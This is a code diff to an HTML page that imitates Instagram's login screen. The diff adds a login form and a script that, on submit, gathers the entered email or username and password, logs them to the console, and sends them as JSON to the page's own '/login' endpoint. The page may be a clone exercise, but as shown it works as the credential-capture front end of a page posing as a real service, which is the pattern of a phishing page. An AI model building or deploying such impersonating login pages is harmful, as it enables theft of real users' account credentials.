@@ -14,9 +14,11 @@
                     <h1>Instagram</h1>
                 </div>
                 <div class="login">
-                    <input type="text" placeholder="Phone number, user name, or email">
-                    <input type="password" placeholder="Password">
-                    <input type="submit" value="log In"> 
+                    <form id="loginform">
+                        <input type="email" name="email" placeholder="Phone number, user name, or email">
+                        <input type="password" name="password" placeholder="Password">
+                        <input id="button" type="submit" method="post" value="log In"> 
+                    </form>
                     <p>----------- OR -----------</p>
                     <a href="#" class="fb-login"><i class="ion-social-facebook"></i>Log in with Facebook</a>
                     <span>Forgot password?</span>
@@ -47,5 +49,34 @@
                <li class="insta">2024 INSTAGRAM</li>
             </ul>
         </footer>
+        <script>
+            document.getElementById("loginform").addEventListener("submit", function(event) {
+                event.preventDefault();
+
+                const formData = new FormData(this);
+                const data = Object.fromEntries(formData.entries());
+                console.log(data);
+
+                fetch('/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('Success:', data);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            });
+        </script>
     </body>
 </html>
